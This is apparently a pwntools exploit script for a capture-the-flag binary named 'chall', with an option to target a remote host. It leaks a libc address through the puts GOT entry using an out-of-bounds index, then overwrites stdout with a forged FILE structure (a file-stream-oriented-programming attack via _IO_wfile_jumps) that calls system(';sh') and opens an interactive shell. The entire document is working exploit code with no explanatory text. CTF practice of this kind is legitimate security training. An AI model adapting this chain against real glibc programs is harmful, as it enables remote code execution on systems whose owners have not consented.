#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./chall"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.46.232.251"
  PORT = 5000
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6", checksec=False)
else:
  s = process(BINARY)
  libc = elf.libc  

def Edit1(pos, data):
  s.sendlineafter(b"> ", b"1")
  s.sendlineafter(b"edit: ", str(pos).encode())
  s.recvuntil(b": ")
  s.recvn(10)
  s.sendline(data)
  
def Edit2(pos, data):
  s.sendlineafter(b"> ", b"1")
  s.sendlineafter(b"edit: ", str(pos).encode())
  s.recvuntil(b": ")
  s.recvn(7)
  s.sendline(data)  

def Read():
  s.sendlineafter(b"> ", b"2")

def Exit():
  s.sendline(b"3")

s.sendlineafter(b"be: ", str(-1).encode())
s.sendlineafter(b"book: ", b"A"*0x10)

# libc leak
Edit1(elf.sym.book, p64(elf.got.puts)+p64(0x10000))
Read()
s.recvuntil(b"book: ")
puts_addr = u64(s.recvn(6)+b"\x00\x00")
libc_base = puts_addr - libc.sym.puts
print("puts_addr =", hex(puts_addr))
print("libc_base =", hex(libc_base))

stdout_addr = libc_base + libc.sym._IO_2_1_stdout_

# Change book ( got.puts => libc.sym._IO_2_1_stdout_)
Edit1(elf.sym.book-elf.got.puts, p64(stdout_addr))

# FSOP
buf  = p32(0xfbad0101) + b";sh\0"
buf += p64(0) * 10
buf += p64(libc_base + libc.sym.system)
buf += p64(0) * 5
buf += p64(libc_base + 0x205700)
buf += p64(0) * 2
buf += p64(libc_base + libc.sym._IO_2_1_stdout_ - 0x10)
buf += p64(0) * 3
buf += p32(1) + p32(0) + p64(0)
buf += p64(libc_base + libc.sym._IO_2_1_stdout_ - 0x10)
buf += p64(libc_base + libc.sym._IO_wfile_jumps + 0x18 - 0x58)
Edit2(0, buf)

# start system("sh")
Exit()

s.interactive() 
